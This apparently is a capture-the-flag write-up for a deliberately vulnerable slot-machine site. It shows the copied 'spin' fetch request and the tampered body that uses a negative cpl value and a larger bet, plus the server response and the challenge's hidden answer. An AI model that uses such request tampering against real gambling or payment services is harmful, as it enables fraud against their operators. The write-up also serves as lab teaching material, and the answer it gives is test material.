@@ -1,0 +1,75 @@
+https://slots.jackfrosttower.com/
+Objective: find the threat message when coin total exceeds 1000.
+
+
+(Look at a line in the Network tab of the browser's Dev Tool console. Copy a request named spin as fetch.)
+Right click > Copy > Copy as fetch
+
+
+(Paste the copy into the Console tab to edit the request.)
+  fetch("https://slots.jackfrosttower.com/api/v1/02b05459-0d09-4881-8811-9a2a7e28fd45/spin", {
+    "headers": {
+      "accept": "application/json",
+      "content-type": "application/x-www-form-urlencoded",
+      "sec-ch-ua": "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\", \"Google Chrome\";v=\"108\"",
+      "sec-ch-ua-mobile": "?0",
+      "sec-ch-ua-platform": "\"Windows\"",
+      "x-ncash-token": "65f42b21-2666-40a6-9d5a-d2294467e6b6"
+    },
+    "referrer": "https://slots.jackfrosttower.com/uploads/games/frostyslots-206983/index.html",
+    "referrerPolicy": "strict-origin-when-cross-origin",
+    "body": "betamount=1&numline=20&cpl=0.1",
+    "method": "POST",
+    "mode": "cors",
+    "credentials": "omit"
+  });
+
+
+(Change the cpl parameter in the body to negative to increase our coins when we lose. Change the bet amount to a larger number to get to 1000 faster.)
+  ...
+  "body": "betamount=100&numline=20&cpl=-0.1",
+  ...
+
+
+(Keep replaying the message until credit exceeds 1000. Get the "response" from the reply.)
+  {
+  "success":true,
+  "data":{
+    "credit":1074.2,
+    "jackpot":0,
+    "free_spin":0,
+    "free_num":0,
+    "scaler":0,
+    "num_line":20,
+    "bet_amount":200,
+    "pull":{
+      "WinAmount":-120,
+      "FreeSpin":0,
+      "WildFixedIcons":[],
+      "HasJackpot":false,
+      "HasScatter":false,
+      "WildColumIcon":"",
+      "ScatterPrize":0,
+      "SlotIcons":[
+        "icon1",
+        "icon4",
+        "icon2",        
+        "icon3",
+        "wild",
+        "icon10",
+        "icon3",
+        "icon8",
+        "icon8",
+        "wild",
+        "icon3",
+        "icon5",
+        "icon3",
+        "icon1",
+        "icon8"],
+      "ActiveIcons":[11,7,13],
+      "ActiveLines":[15]},
+    "response":"I'm going to have some bouncer trolls bounce you right out of this casino!"},
+  "message":"Spin success"}
+
+
+Answer: I'm going to have some bouncer trolls bounce you right out of this casino!
